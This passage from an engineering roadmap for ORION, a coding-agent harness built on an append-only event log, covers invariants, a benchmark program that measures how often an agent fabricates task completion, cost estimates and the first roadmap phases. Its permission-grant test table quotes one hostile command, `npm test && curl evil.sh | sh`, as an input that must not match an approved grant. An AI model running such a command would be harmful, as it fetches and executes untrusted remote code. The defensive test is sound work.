| T2 | No general rule preventing the next capability-metadata duplication | — | **RESOLVED in W5** — and the rule immediately caught a second instance: `PATH_TOOLS` in `compact.mjs`, now derived via `pathAddressedTools(makeTools(null))` rather than hand-maintained |
| T3 | `isKnownDangerous` absent from the public barrel while `classifyShell` is exported | `src/index.mjs:94` | **RESOLVED in W5** |

### B.7.7 Observability

| # | Issue | Severity | Current status |
|---|---|---|---|
| O1 | No structured logging | Medium | **OPEN → P11** |
| O2 | No metrics | Medium | **OPEN → P11** |
| O3 | No tracing seam (TrueForge's `NOOP_AGENT_TRACING` pattern) | Medium | **OPEN → P11** |
| O4 | No health/readiness beyond `doctor` | Low | **OPEN → P11** |

**Note.** These are *operational* observability. *Trajectory* observability — the differentiator —
is owned by **P5**, and the two must not be conflated: P5 makes the execution record legible to a
developer; P11 makes the service legible to an operator.

### B.7.8 Storage growth

| # | Issue | Evidence | Current status |
|---|---|---|---|
| G1 | No retention policy; ~596 B/event, 598 MB @ 1M | MEASURED | **OPEN → P11** |
| G2 | No artifact GC | — | **OPEN → P11** |
| G3 | No archival/export path | — | **OPEN → P5** (export/share) and **P11** (archival). E3 has since measured store integrity at ≥16 concurrent writers, so growth — not contention — is the remaining storage question |

### B.7.9 Quality tooling

| # | Issue | Current status |
|---|---|---|
| Q1 | No type checking | **RESOLVED in W5** — `npm run typecheck` (`tsc --noEmit`); it caught X3 statically, and a dead `supportsBlockGlyphs` branch that had never once executed |
| Q2 | No coverage measurement | **RESOLVED in W5** — `npm run coverage` |
| Q3 | No lint/format | **RESOLVED in W5** — `npm run lint`, 112 files clean |

### B.7.10 Documentation drift

| # | Issue | Current status |
|---|---|---|
| D1 | `docs/ARCHITECTURE.md` said "6 tools" | **RESOLVED** — verified: the string no longer appears. Current counts are in §B.3 |
| D2 | `tools/index.mjs` header listed 6 | **RESOLVED in W5** |
| D3 | `current-product-surface.md` pre-Wave-1 and materially wrong | **RESOLVED in W5** |

### B.7.11 Summary

| Disposition | Count |
|---|---|
| **RESOLVED** (W5, or verified closed since) | 26 |
| **OPEN → P5** | 1 (G3, export half) |
| **OPEN → P11** | 8 (P3, O1–O4, G1, G2, G3 archival half) |
| **PARTIALLY OPEN, unowned and small** | 1 (X6 timeout layering) |

**Nothing is orphaned.** Open rows are owned by a phase in Part E; the live view of current debt is
**§B.6**, not this table.

---

# PART C — NORTH STAR, ARCHITECTURE, INVARIANTS

## C.0 The user problem and the user outcome

**The user problem.** A developer delegating work to a coding agent cannot tell what it actually
did. Transcripts show what the model *said*; they do not establish what changed on disk, what was
verified, what was approved, what it cost, or whether the agent's claim of success is true. When
something goes wrong mid-task the developer cannot reconstruct the decision that caused it, and
cannot resume without risking a duplicated side effect.

**The user outcome ORION targets.** A developer should be able to say *"fix this issue"* and get a
result comparable to any serious harness — and afterwards be able to ask, and be answered
precisely: *what did it do, what did it change, what was verified, what was uncertain, what
resources were involved, what did it cost, why did it stop, and what happens if I fork execution
from before the risky operation?*

**The positioning that follows:**

> **ORION is the coding-agent harness whose account of what happened cannot be wrong.**

Not the fastest. Not the one with the most tools. The one where *"it says it fixed the bug"* and
*"it fixed the bug"* are the same statement, and where proving it afterwards costs nothing.

## C.1 The one idea

> **A run is an append-only log of events; state is a bounded projection of that log.**

Four capabilities that are normally four subsystems fall out of one mechanism:

| capability | how |
|---|---|
| **resume** | fold the log, continue |
| **replay** | fold the log, stop early |
| **fork** | copy the log to event N, continue |
| **explain** | render the log |

Nothing mutates a run except by appending an event.

### C.2 The organising principle for every future capability

> **Everything an agent does becomes attributable execution state.**

Each new capability must land as trajectory events with provenance, never as a side system. A
subagent is a child trajectory. An MCP call is a resource-bound tool invocation. A memory is a
derived claim linked to the events that produced it. A skill activation is provenance on the turn
it influenced. A sandbox binding is an event, not a column.

**If a feature cannot be expressed as attributable execution state, that is evidence the design is
wrong — not that the model should be relaxed.**

### C.3 Table stakes, enabling infrastructure, differentiators

Three categories, and the distinction is load-bearing: it is what prevents the roadmap becoming a
competitor feature-count exercise.

**C.3.1 Table stakes — required to be taken seriously, never a source of advantage.**
Shell · read/write/edit · grep · regex search · glob · git · diff · test execution · project
instructions · skills · configuration · permissions · approvals · MCP · provider switching ·
streaming · sessions · turns · subagents · TUI · `--json` · SDK · export/import · LSP · web/browser
where justified · multimodal where justified · hooks/plugins where justified.

**Status:** complete as of W9 except LSP, web/browser, multimodal, hooks/plugins, TUI polish, SDK
and `--json` coverage. Maintain these; never market them.

**C.3.2 Enabling infrastructure — what makes the table stakes safe and reliable.**
OS sandbox · per-run workspace · per-child workspace · network policy · resource identity ·
resource lifecycle · reattachment · Recovery 2.0 · **Grant Store** · quotas · budgets · provider
failure/retry/rotation · child isolation · background execution · migrations · observability.

**Grant Store belongs here, explicitly.** It is required security/autonomy infrastructure — durable
approval memory without which "autonomous execution" means being asked about `npm test` on turns 3,
7 and 12 of the same task, which manufactures consent rather than obtaining it. It is **not** the
marketing moat, and describing it as one would be inaccurate. Full disposition in Part F.

**C.3.3 ORION differentiators — protect, extend, never trade away.**

Verified against eight comparator systems (Claude Code, Codex, OpenCode, Deep Agents, QM, Ruflo,
TrueForge, Hermes Agent). Four properties are structural and absent in all eight:

| Property | Why it is hard to copy |
|---|---|
| **Execution-granular event sourcing** | requires the executor to be built around an immutable log from the start. Ruflo has a genuine append-only event store with projections and a state-reconstructor — but its aggregates are `agent`/`task`/`swarm`/`memory` and it emits **zero** tool or model events. Its log does not contain the run. |
| **Deterministic replay at zero model cost** | requires every state-affecting decision — including compaction and context assembly — to be an event |
| **Per-invocation effect classes + pre-state witness** | recovery computed from a tool call's *arguments*, not its identity: `bash("echo x >> f")` duplicates on re-issue, `bash("mkdir -p a/b")` does not. Hermes' idempotency is an API-key cache at the HTTP boundary — a different layer solving a different problem. |
| **Arbitrary-point fork with complete lineage** | TrueForge's `ancestor_ids` "need not reach the session root"; Deep Agents forks threads. Neither guarantees complete provenance from any point. |

Plus one property that is **uncontested but cheap to copy**:

- **Truthful completion.** Found in **zero of eight** comparators, and perhaps 200 lines of code.
  Its only durable protection is that competitors optimise for demo-quality success rates and a
  completion contract *lowers* the headline number. **The defence is to publish it as a measured
  fabrication rate** (Benchmark F1/F4, Phase P7), converting a copyable feature into a number
  rivals must answer or visibly decline to answer.

**C.3.4 Withdrawn claims — recorded so they are not re-asserted.**

| Claim | Status | Reason |
|---|---|---|
| Durable fencing is uniquely ORION's | **WITHDRAWN** | **FACT:** Hermes Agent has `gateway/turn_lease.py` (352 lines), a configurable `gateway_turn_lease_timeout`, lease-refresh-failure handling, holder-qualified release, and fencing tokens that "supersede this token and fence late deltas out". Fencing remains **critical execution/reliability infrastructure** and an Invariant (C.4 #4) — it is simply not a differentiator. The surviving distinction is narrower: Hermes' leases protect *mutable durable rows* that get rolled back; ORION's fence appends to an *immutable log*, so there is nothing to roll back. That is a consequence of C.3.3 property 1, not an independent moat. |
| Team learning is a moat | **HYPOTHESIS ONLY** | no evidence exists. Must not appear in positioning until measured. See Part I. |
| Resource identity is a moat | **NO** | TrueForge has the mechanism (`TurnResourceResolver`, `sandbox_info`, `mcp_servers` per turn). ORION's storage shape is better; that is an engineering preference, not a moat. |

### C.4 Invariants that must never be compromised

A future feature is not permitted to silently weaken any of these. Each names its guard.

| # | Invariant | Guard |
|---|---|---|
| 1 | The trajectory is the authoritative execution history | `Store.append` is the only mutation path |
| 2 | Deterministic replay at zero model cost | replay-equivalence test, every wave |
| 3 | Effect-aware recovery per invocation | ADR-002/003/011; crash matrix |
| 4 | Execution fencing — a worker that lost its lease cannot write | lease token checked on every write |
| 5 | Truthful completion — stopping is not completing | ADR-013; `tests/shipped` verdict table |
| 6 | Provenance — model, provider, context, artifact, decision | `model.requested` digest; `artifact.created` |
| 7 | Explainability — a run can be narrated from its log alone | `explain` |
| 8 | Resource-aware recovery — resume reattaches, never reconstructs blindly | W6 |
| 9 | Cross-version durability — an old log replays under a new build | additive-only contract test |
| 10 | Developer usability — a real developer can invoke it from the supported path | `tests/shipped` |

**Invariant 10 is new in this edition** and is the lesson of F3/F5: six defects across four waves
were mechanisms that worked and were unreachable. A capability that a module exports but the CLI
cannot reach is not shipped.

### C.5 Anti-patterns, explicitly forbidden

Derived from six-repository research (`ORION-DEEP-COMPARATIVE-ARCHITECTURE-AUDIT.md` §26):

- **Hidden mutable state** beside the log (TrueForge stores resource identity in a mutable
  `TurnRecord.snapshot`; ORION must emit events instead).
- **Middleware pipelines** that mutate state in sequence (Deep Agents' model — rejected).
- **History rewriting** (`AGENT_CONTEXT_OVERWRITE` — rejected).
- **Read-time transformation** that affects execution (a summarization computed on read breaks
  replay; it must be an event).
- **Opaque child returns** with no lineage.

### C.6 The feature-entry gate

**No capability becomes committed implementation work until all thirteen are answered.** This gate
exists because the fastest way to destroy this project is to let the roadmap become a list of
things competitors have.

| # | Question |
|---|---|
| 1 | What **user problem** does it solve? |
| 2 | What **user outcome** results? |
| 3 | What is the **current gap** — measured, not assumed? |
| 4 | What **evidence** says this is needed? |
| 5 | What are its **execution semantics** (loop, cancellation, failure, concurrency)? |
| 6 | What is its **event / provenance representation**? |
| 7 | What are its **security implications**? |
| 8 | What does it **depend on**? |
| 9 | Which **benchmark ID** measures it? |
| 10 | What is its **made-to-fail test** — how would we know if it silently stopped working? |
| 11 | What **product surface** exposes it (Invariant 10)? |
| 12 | What are its **acceptance criteria**? |
| 13 | **Why is it ordered where it is?** |

**If any answer is unknown, the item goes to Part I (Research / Candidate / Conditional) with an
explicit investigation trigger — not into a phase.** This applies without exception to: hooks, LSP,
web/browser, multimodal, plugins, advanced memory, scheduling, additional integrations, team
learning, and anything newly proposed.

**Corollary — the required derivation direction.**

```
user problem → evidence → architecture → benchmark → implementation
```

never

```
competitor has X → therefore build X
```

### C.7 Implementation-stream discipline

**One primary implementation stream.** Sequential, each phase carrying a real acceptance gate.

**At most one secondary stream**, permitted only when all three hold:

1. it does not alter execution semantics;
2. it has independent acceptance criteria;
3. it cannot corrupt or invalidate the primary sequence.

**INFERENCE:** the project's foundation was produced by exactly this discipline — scope →
implementation → tests → real run → failure test → report → acceptance. Running five concurrent
tracks would produce five half-finished waves and no gate discipline. Capability *areas* may be
organised conceptually; *implementation sequencing* stays concrete and serial.

---

## C.8 Quality standards — hard gates, not scores

**The subjective 1–10 maturity table that occupied this section has been REMOVED.** It rated
dimensions such as Architecture 8, Security 5, Observability 4. Those numbers were unfalsifiable
and gameable, and rating a dimension is not the same as measuring a property.

Replaced by three instruments, defined in Part D:

1. **Hard gates** — correctness and safety properties with zero tolerance.
2. **Measured values** — capability and cost numbers with a named benchmark and task class.
3. **UNKNOWN — NOT YET MEASURED** — stated explicitly, with the experiment that resolves it.

No adjective ("excellent", "strong", "best", "robust") may describe a capability in this plan
unless it is immediately followed by an objective criterion.

**The observation the old table made is retained, because it remains true (INFERENCE):** ORION is
strongest on the dimensions its architecture is *about* and weakest on the dimensions of *running
software over time* and *a human experiencing it*. Nothing in the weak column requires changing the
trajectory model.

---

## C.9 Maturity levels — the ladder (RETAINED; Level 3 is P11 exit)

ORION does not claim a level because its core is well engineered. Each level has exit criteria.

### Level 0 — Prototype
Mechanisms exist; composition unproven. *(ORION left this at Wave 1.)*

### Level 1 — Reliable local runtime
Durable, recoverable, replayable single-user runtime; real-model verified; CI green.
**Exit:** crash matrix passes; replay equivalence holds; manual gate passes on an installed build.
**STATUS: ACHIEVED (Wave 4.5).**

### Level 2 — Serious coding-agent developer tool
A developer can do ordinary work: search, skills, project instructions, config, MCP, safe defaults.
**Exit:** glob + regex search; project instructions; config file; skills; MCP behind isolation;
autonomous default posture backed by a real boundary; the §11 manual gate on a real repository the
author did not write.

**Implementation status: ACHIEVED (W9/W10).** Every exit criterion above is shipped — glob and
regex search (W8), project instructions and skills (W7), config file (W8), MCP behind the container
boundary (W9), autonomous posture backed by a real boundary (W6), and the manual gate exercised on
repositories the author did not write.

**Frontier task capability: NOT YET MEASURED — see E5 (§D.3).** Shipping the capability surface and
being *good* at developer work are different claims. E4 measured 10-file subtrees at ~4.4 model
calls per run and is not evidence for the second.

### Level 3 — Production single-user runtime
Survives upgrades and time.
**Exit:** migrations + old-DB upgrade test in CI; retention/GC; backup/restore documented; metrics
and structured logs; rollback path proven; ≥1 published release with a documented deprecation
policy.
**STATUS: W13.**

### Level 4 — Team / shared execution
Multiple developers, multiple concurrent runs, shared history.
**Exit:** measured multi-process concurrency (E3); per-run workspace isolation; resource quotas;
identity enforced (`scope`/`principal`); audit surface; soak test.
**STATUS: W13–W14.**

### Level 5 — Hosted / scalable execution infrastructure
**Exit:** Postgres Store behind an unchanged `Store` API; queueing; rate limiting; idempotency;
leader coordination; object storage for artifacts; multi-tenancy enforced; load + soak evidence.
**STATUS: W14, and deliberately not before.**

---

# PART D — BENCHMARK PROGRAM

Measurement is a first-class phase, not documentation attached after development.

## D.0 Benchmark discipline — permanent

1. **Pass criteria are declared before the run.** A criterion discovered after seeing the data is a
   story, not a measurement.
2. **Every benchmark must be able to fail, and must be deliberately falsified once** — break the
   thing it measures and confirm it goes red. W10's first concurrency proof passed with batching
   disabled.
3. **Attribute every failure to a layer** — `model` / `provider` / `runtime` / `tool` / `judge` —
   from the event log, not by inference.
4. **State the test class** (deterministic / stubbed / shipped-path / live-provider /
   live-repository / benchmark). A number without its class is meaningless.
5. **State the confounds.** One local model serialises generation; a shared store measures the
   store, not the model.
6. **n ≥ 3 for any mechanism claim.**
7. **Never retrofit a historical ledger** after fixing an instrument. Publish the new number as its
   own measurement.
8. **Anti-gaming, inherited from the Stage-1 corpus work:** two-sided bracketing (the verifier must
   fail on the seeded copy and pass on the pristine copy), oracle restore before judgement, the
   verifier is never a model, test-file diffing so "delete the failing test" cannot score, fresh
   workspace per run, source trees never written.

## D.1 The ladder

| Level | Question | Instruments |
|---|---|---|
| **A** | Are the harness guarantees true? | hard gates — replay, fork, fencing, recovery, effect attribution, truthful completion, resource recovery, Grant Store semantics, trajectory integrity, cross-version replay, budget durability |
| **B** | Can ORION do real developer work? | **E5** |
| **C** | What does ORION *itself* contribute beyond the model? | **E6** |
| **D** | What does it cost the developer? | machine-observable effort metrics from E5 onward; human study gated |
| **E** | How does it compare externally? | Terminal-Bench, SWE-bench Verified — *reference only* |

## D.2 Level A — harness correctness (hard gates, zero tolerance)

| Gate | Requirement |
|---|---|
| Deterministic replay | 100% — final projection byte-identical, **zero model calls** |
| Projection equivalence | 100% — cold == warm, every run |
| Fork correctness | 100% — fork at seq *k* inherits exactly 1..k, lineage intact |
| Cross-version replay | 100% — a log written by an older build replays under the current one |
| Fencing violations | **0** |
| Effect duplication in defined recoverable classes | **0** |
| Orphan handling | 100% correct classification; escalate when unknowable |
| Crash recovery | 100% resume-and-complete |
| Resource reattachment when promised | 100%, `reconstructed: false` |
| Sandbox escapes | **0** |
| Path boundary violations | **0** |
| Network egress violations | **0** |
| Permission false-allows | **0** |
| Approval bypass | **0** |
| Grant authorization violations | **0** |
| Child privilege escalation | **0** |
| Credential leakage | **0** |
| Concurrent writers, N ≤ 16 | seq exactly 1..N, no gaps or duplicates |
| **Store open contention** | 100% — regression guard for the §B.1.1 PRAGMA defect |
| Fabricated completion on the entrapment set | **0 target** |

**Grant Store coverage (S1–S6)** — required, because a grant that works in one shape and fails in
another is a defect only measurement makes visible. Grant state is event-derived, so every test has
a replay twin: the original and replayed run must reach the *same* authorization decision.

| ID | Measure | Bar |
|---|---|---|
| S1 | Expiry honoured before, refused after | 100% |
| S2 | **Revocation under replay** — replay reaches the identical decision from the fold | 100% |
| S3 | **Fork semantics** — fork before and after a grant/revoke; each branch projects grant state true to its own events | 100% |
| S4 | Child/grandchild inheritance stays within declared scope at every posture | 100%, 0 violations |
| S5 | **Normalised-exact matching** — `npm test` matches only itself, never `npm test && curl evil.sh \| sh`, never a glob | 100%, 0 false allows |
| S6 | Decision parity across concurrent runs sharing a store | 100% at N ≤ 16 |
| S7 | Resource grants (MCP server, container) scoped and revocable | 100% |

## D.3 Level B — E5, the frontier developer benchmark

**Purpose:** the first real capability measurement at frontier model grade.
**Provider:** GLM-5.3-Flash through the existing `openai-compat` path — **no new provider code**.
**Precondition:** CONDITION B1 (§B.1.1) — a clean, identified baseline SHA.

**Why E4 does not answer this.** E4 used 10-file dependency-free subtrees, ~4.4 model calls per run,
no `AGENTS.md`, no skills, no multi-file work, no subagents, and produced **zero** compaction
events in 54 runs. **E4 is retained as harness/instrument baseline evidence and must never be used
as a general coding-capability score.**

**Task set** — 24 tasks over the six repositories in `research/repos/`, n=3, plus the
differentiator and entrapment suites:

| Class | Count | Shape | Expected turns |
|---|---|---|---|
| S — short | 6 | single-file bug fix, seeded regression, verify command | 3–8 |
| M — medium | 6 | multi-file change ≥2 files, tests must pass | 10–20 |
| L — long | 6 | exploration → change → verify; **whole-repo workspace with its own `AGENTS.md` and skills loaded** | 20–50 |
| XL — whole repo | 3 | ambiguous requirement, build/test failure to diagnose, multi-step | 50–100 |
| D — delegation | 3 | run twice, with and without `subagent` | 15–40 |

**Recorded per run:** success · verified success · fabricated success · grade (pass/partial/fail) ·
model calls · tool calls · trajectory length · input tokens · **cached input** · output tokens ·
reasoning tokens where available · retries · replans · verification calls · compaction events ·
artifacts · grants used · escalations · children spawned · child tokens · TTFT · model latency ·
tool latency · wall time · **cost** · failure layer.

**Derived headlines:** verified success by task class · **fabrication rate** · cost per verified
success · tokens per verified success · cache hit rate · degradation slope vs trajectory length.

**Phase gates inside E5:**

- After the smoke run: `cached_tokens` must be non-zero on a second identical call, or the cost
  model is wrong and must be re-derived.
- After S/M: if results are not materially better than E4's local-qwen numbers, **stop** — the
  bottleneck is not model grade and the analysis needs revisiting.
- After L: if whole-repo runs fail on *context assembly* rather than reasoning, that is a **harness**
  finding and XL/D wait for a fix.

**Entrapment set (6 deliberately unsatisfiable tasks)** — a test asserting a mathematical
contradiction; a plausibly-named file that does not exist; a test depending on an unreachable host;
a "bug" that is correct as specified; two contradictory requirements; an uninstallable library.
**Metric: `fabrication_rate = completed / 6`, target 0.** Secondary and equally important:
**honest-failure quality** — `FINISHED_WITHOUT_CHANGE` with a clear reason is a *pass* for the
harness.

**Differentiator suite X1–X10, run against a live model** (this is what distinguishes it from the
existing crash matrix): effect-aware crash recovery · deterministic replay at zero cost · fork from
three points · fencing · truthful completion · resource reattachment (container + MCP) · durable
budget enforcement · provenance reconstruction per turn · trajectory integrity under concurrency ·
recovery after external tool interruption.

**X2 and X5 are the two publishable numbers:** replaying a real GLM run for $0.00 with a receipt,
and the fabrication rate.

### D.3.1 Cost model — the assumptions behind the estimate

The estimate below is derived, not asserted. **All figures are assumptions until the first run
reports real usage.**

**Pricing (GLM-5.3-Flash, as quoted to the project 2026-09-17 — UNVERIFIED against a current
provider pricing sheet, and must be re-checked before the run):**

| Rate | Value |
|---|---|
| Input | $0.075 / 1M tokens |
| **Cached** input | $0.015 / 1M tokens |
| Output | $0.25 / 1M tokens |
| Context window | ~1.31M tokens |

**Token-mix assumptions, extrapolated from the E4 matrix** (whose own token counts were *estimated
from `context_bytes`*, because Ollama's OpenAI-compatible endpoint reports zero usage — this is the
weakest link in the model):

| Assumption | Value | Basis |
|---|---|---|
| Mean model calls per run | 4.4 (S/M), rising to ~30–60 (L/XL) | E4 measured; L/XL extrapolated |
| Input tokens **sent** per run | ~5.1k (S/M) — context is re-sent every call | E4 `context_bytes` |
| Input tokens per whole-repo run | ~150–250k — a ~44 KB system prompt re-sent each call | ruflo's `AGENTS.md` 25,273 B + 137 skills (18,703 B disclosure) |
| Output tokens per run | ~180–300 | E4 |
| Cache hit rate | ~70% | INFERENCE — intra-run resends occur seconds apart, so the true rate may be higher |

**Composition:** 24 tasks × n=3 = 72 runs (S 18, M 18, L 18, XL 9, D 9 run twice = 18), plus ~20
differentiator runs (X1–X10) and 18 entrapment runs across 3 providers ≈ **~122 runs**.

**Estimated cost: approximately $1.50 under the stated pricing and token assumptions above; the
actual cost is measured from provider usage and is authoritative.** The `cached_tokens` smoke gate
(§E.5 / §D.3 phase gates) exists precisely to test the 70% cache assumption on the first day — if it
returns zero, this model is wrong and must be re-derived before the matrix proceeds.

**Cost is not the constraint; quota
and wall-clock are** — which is why provider retry/rotation (P1) must land first.

**E5 is explicitly NOT:** a SWE-bench entry, a model comparison, or a tuning exercise. **No
`v0/src` change during measurement**; rig defects are logged and fixed *between* phases with the
affected phase re-run.

## D.4 Level C — E6, controlled harness attribution

**Purpose:** E5 can say *"ORION + GLM achieved X"*. It cannot say *"ORION contributed X"*. E6
isolates the harness's own contribution.

**Design — every confound controlled.** Same model · same task set · same repositories · same
verifier · same environment · same budget · same wall-clock allowance · equivalent tool semantics
where achievable, with every divergence recorded as a stated confound.

**Compare:** ORION vs a controlled baseline harness capable of using the same model and broadly
equivalent tools.

**Invalid comparisons that must never be made:** different models, different task sets, different
verifiers, different budgets, or materially different tools — and then claiming the result measures
ORION. **UNKNOWN — NOT YET MEASURED:** which baseline harness is the fairest control. Selecting it
is part of E6's design work and must be justified in writing before the run.

**E6 is designed separately from E5 and runs after it.** Folding it into E5 would contaminate the
one measurement currently well-specified.

## D.5 Level D — developer effort

**Machine-observable, captured from E5 onward, automatically, from the event log:**

| Metric | Source |
|---|---|
| Human interventions per task | `human.requested` / `human.responded` |
| Approval interruptions per task | `tool.escalated` |
| Time to verified completion | wall clock to verifier pass |
| Manual recovery actions | `resume` / `answer` invocations |

**Human study — GATED, not scheduled.** Review time, failure comprehension, time to reproduce a
problem, usability and satisfaction require *the trajectory product to exist* and *real users to
exist*. Neither condition holds. **Trigger:** the developer product (P5) has shipped and ≥5 external
developers are using ORION on their own repositories. Creating a fake human benchmark that assumes
users exist would produce numbers about nobody.

## D.6 Level E — external references

**Later, when meaningful.** Terminal-Bench (containerised terminal-agent tasks); SWE-bench Verified
(500 expert-verified instances). **Label these as external reference measurements.** Do not claim
direct comparability when task environments differ, and note that SWE-bench's submission policy is
research-oriented rather than a product leaderboard path.

**Internal corpora are never externally comparable.** E5's corpus is six repositories we chose; its
number must never be presented as a benchmark score.

## D.7 Model onboarding / provider compatibility

**Why.** Model and provider surfaces differ in tool-shape, streaming behaviour, context window and
timeouts. A developer must not hand-tune those per model, and a misconfigured profile must fail at
validation, not inside a trajectory.

| ID | Question | Measure | Bar |
|---|---|---|---|
| O1 | **Zero-config first-run** — one command selects a model and the correct profile is applied (endpoint, auth, tool surface, streaming, context window, timeout, retry) | first-run setup completes with no manual configuration | 100% across all supported profiles; setup is exactly one step |
| O2 | **Live-provider execution across supported model classes** — every profile passes `tests/live` (read-and-answer, single edit + verify, entrapment) | verified success + correct tool/streaming/context behaviour per profile | 100% pass; every failure attributable to the provider, not to configuration |

Profiles are declarative data and are trajectory-neutral: a profile change never changes the meaning
of a recorded trajectory, and replay equivalence (Level A) is unaffected.

---

# PART E — POST-W10 DEVELOPMENT ROADMAP

**W0–W10 are history (Part A) and are not re-planned here.** This part charts what follows.

Phases are labelled **P0…P12** rather than continuing the W-numbering, so they cannot be confused
with the completed waves. Every old W11–W14 capability survives and is mapped in Part J.

## E.0 How placement works

Every phase is **fully specified now** — scope, dependencies, event/provenance impact, security
impact, product surface, benchmark IDs, made-to-fail tests, acceptance criteria, non-goals, and the
reason for its ordering.

**Placement may be conditional on E5/E6 evidence.** Where it is, the trigger and both consequences
are written out. Uncertainty is never an excuse for vagueness: the work is designed either way, and
the evidence decides *when*, not *whether it is understood*.

## E.1 Dependency graph

```
P0 commit pending fixes  (baseline integrity — CONDITION B1)
        |
        +--> P1 Provider Truth ---------+
        +--> P2 Isolation Debt          |   (P1-P3 are independent subsystems;
        +--> P3 Provenance Completion --+    P3 batches its contract bump with P2)
                                        |
                                        v
                               P4 E5 MEASUREMENT
                                        |
   +-------------+---------------+------+--------+---------------+
   v             v               v               v               v
P5 Developer  P6 Context/     P7 Truthful-   P8 Autonomy    P9 Agent
   Product       Memory          ness          Maturity       Capability
 (uncond.)    (conditional)   (uncond.)     (conditional)   (conditional)
   |                                            |
   +--------------------+-----------------------+
                        v
                P10 E6 ATTRIBUTION
                        |
                        v
                P11 Production Operations
                        |
                        v
                P12 Hosted Scale  (demand-gated)
```

**Ordering rationale.** P1–P3 are prerequisites that do not depend on measurement: the suite cannot
see a live model, W10 left an isolation debt, and two provenance fields become unrecoverable with
every run recorded without them. P4 then converts three open strategic questions — agent capability,
retrieval demand, subagent economics — into numbers, which is why five downstream phases are
conditional on it.

---

## P0 — Baseline integrity

**Problem.** `HEAD` is not the tree. Three verified shipped-source fixes are uncommitted, so
`c75ba6b` still loses 2 of 8 simultaneous store openers (§B.1.1).

**Scope.** Commit the three fixes; record the resulting SHA as the measurement baseline; confirm the
single authoritative repository path.

**Acceptance.** A clean tree at an identified SHA; full suite green from a fresh clone; `npm pack`
from a **clean checkout** installs and runs — the W8 lesson, where a dirty-tree tarball passed while
`HEAD` could not load.

**Benchmark.** Level A store-open contention gate.
**Non-goals.** No new functionality.
**Why here.** Everything downstream is measured against this tree.

---

## P1 — Provider truth and resilience

**User problem.** A developer's run dies on a provider hiccup and the harness has no answer. A
provider-shaped defect ships because nothing automated ever called a real model.

**User outcome.** Runs survive rate limits and stalled streams; provider regressions are caught by
CI rather than by hand.

**Current gap (MEASURED).** No automated assertion calls a live model (§B.4). Four historical
defects escaped 2000+ assertions: the Gemma tool-call array, the Qwen empty completion, the Gemini
`thought_signature` round-trip, and Groq returning all output in `reasoning`. A 429 killed the W10
gate five times; a Hive outage across seven keys stopped a wave (D3, D8).

**Scope.**

1. `tests/live/` — **opt-in by env var, never in the default `npm test`**: three tiny tasks
   (read-and-answer, single edit + verify, one deliberately impossible task) against a real provider.
2. Provider **retry with backoff, key rotation, and failover** in the provider seam, driven by the
   existing key vault.
3. **Stream-idle watchdog** — abort and retry a stalled stream rather than waiting out the request
   timeout.
4. **Model-aware provider profiles** — declarative, model-class-scoped defaults (endpoint, auth,
   tool surface, streaming, context window, request timeout, retry/backoff) so a developer can
   select a model with **one command** and receive correct configuration automatically. Profiles are
   pure data: schema-validated, reviewable, machine-checked, and **never alter trajectory
   semantics**.
5. Wire GLM-5.3-Flash as the first documented profile (and the E5 instrument — §D.3).
6. Rider: close the **W3b** gate (D8), blocked by a provider-side 401-on-resume.

**Execution semantics.** Retry and rotation are a *degradation*, not a new state: they emit
`degraded` (existing type, ADR-010) and never alter the trajectory's meaning. A retried request
keeps the same logical turn. Provider profiles are declarative configuration: no new event types,
no new state, no second source of truth.
**Event / provenance impact.** No new types. The `degraded` payload gains provider and key identity
in `ext` — key **id** only, never key material.
**Security.** Key material never enters the log, an artifact, or a child's environment.
**Dependencies.** P0; a GLM key.
**Product surface.** `orionctl doctor` reports provider health and rotation state; one-command model
selection (`orionctl model <name>`) loads the correct profile with no further configuration.
**Benchmarks.** F1, F4 (first fabrication numbers), L5 (retry cost share), D-series, **O1–O2**
(§D.7).
**Made-to-fail.** Force a 429 and a mid-stream stall; the suite must go red if rotation or the
watchdog silently stops working. Select a model class with a wrong tool surface; the profile
validation must fail loudly rather than misroute.
**Acceptance.** Live suite green on two providers; a forced 429 transparently rotates and the run
completes; a stalled stream aborts and retries within the watchdog window; every supported profile
passes O1–O2 (§D.7).
**Non-goals.** No new provider *kinds*; **no model-routing policy** (profiles are declarative
defaults, not a load-balancing policy); no cost optimisation.
**Why first.** It is the largest verified gap and it unblocks every live gate downstream.

---

## P2 — Isolation debt (child resource isolation)

**User problem.** Two delegated children editing in parallel can corrupt each other's work.

**Current gap (FACT).** W10 shipped sibling parallelism while siblings share one container and one
`ORION_HOME` (D1, D2). **This is the one place the dependency graph was violated in the built
system** — isolation should have preceded parallelism.

**Scope.**

1. Per-child scratch workspace.
2. A **merge-back event**, so the merge is in the log and replay reproduces it.
3. Per-child CPU / memory / PID caps in `ContainerSandbox`.
4. Isolation test: two siblings writing the same path cannot observe or corrupt each other.

**Execution semantics.** A child's workspace is a resource with durable identity, acquired and
released like any other. Merge-back is an explicit, attributable step, never an implicit copy.
**Event / provenance impact.** **+1 type** for merge-back, contract **v6 → v7**, additive.
**Batch this bump with P3** so there is one contract touch, not two.
**Security.** Closes a cross-child integrity gap. Must not widen any posture.
**Dependencies.** P0; container backend (built).
**Benchmarks.** H4 (**expected to FAIL today** — that is the point), H5, M5, G8.
**Made-to-fail.** Disable per-child workspaces; H4 must go red.
**Acceptance.** H4 passes; limits measured on two independent channels — kernel cgroup read *and*
observed behaviour — as W6.1 established.
**Non-goals.** Not background children (P8); not structured delegation (P8).
**Why here.** Correctness debt in shipped code, and a prerequisite for any further parallelism.

---

## P3 — Provenance completion

**User problem.** "Did this change improve outcomes?" is unanswerable across releases, because
nothing records which version of ORION produced a trajectory.

**Current gap (FACT).** No `harness_version` on the run record; `principal` is written but never
enforced or varied. **Both are unrecoverable later** — every run recorded without them is
permanently unattributable.

**Scope.** Add `harness_version`; enforce `principal`. Contract **v6 → v7**, additive, batched with
P2.
**Event / provenance impact.** Run-record fields. Old logs must still replay.
**Dependencies.** P0; batched with P2's bump.
**Benchmarks.** E4 (cross-version replay) with a v6 log under a v7 build; X8 (provenance
reconstruction complete for every turn).
**Made-to-fail.** Strip the fields; X8 must go red.
**Acceptance.** A v6 log replays identically under the v7 build; every turn's provenance is
reconstructible from the log alone.
**Non-goals.** No other contract changes in this phase.
**Why here.** Cheap, small, and the only genuinely irreversible item on the roadmap.

---

## P4 — E5 frontier measurement

**Scope.** Execute Part D §D.3 in full: ~122 runs, **approximately $1.50 under the pricing and
token assumptions stated in §D.3.1; actual cost is measured from provider usage and is
authoritative.**

**This is where three strategic questions become data** — agent capability at frontier grade,
retrieval demand, and subagent economics — instead of argument.

